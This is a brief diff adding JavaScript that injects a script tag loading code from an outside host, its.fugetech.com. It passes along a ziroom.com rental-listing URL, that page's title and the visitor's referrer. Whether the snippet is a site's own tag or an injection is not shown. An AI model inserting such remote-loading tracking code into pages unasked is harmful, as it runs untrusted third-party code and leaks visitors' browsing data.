@@ -1,0 +1,4 @@
+
+  var s0 = document.createElement("script");
+  s0.src = "http://its.fugetech.com/_cm.js?p=3752&k=B699A0CCE5009DE9&g=03c27109879f4f1d9a808443d366ad51&lp=http%3A%2F%2Fwww.ziroom.com%2Fz%2Fvr%2F60235311.html&ti=%E3%80%90%E8%87%AA%E5%A6%82%E7%BD%91%E3%80%91%E5%8C%97%E4%BA%AC%E9%80%9A%E5%B7%9E%E9%80%9A%E5%B7%9E%E5%8C%97%E8%8B%91%E5%85%AB%E9%80%9A%E7%BA%BF%E9%80%9A%E5%B7%9E%E5%8C%97%E8%8B%91%E6%96%B0%E5%8D%8E%E8%81%94%E9%94%A6%E5%9B%AD4%E5%B1%85%E5%AE%A4%E3%80%90%E6%88%BF%E5%B1%8B%7C%E5%8D%95%E9%97%B4%7C%E5%85%AC%E5%AF%93%E5%87%BA%E7%A7%9F%E3%80%91&rf=http%3A%2F%2Fwww.ziroom.com%2Fz%2Fnl%2Fz3.html&from_url=" + encodeURIComponent(document.referrer);
+  document.getElementsByTagName('head')[0].appendChild(s0)
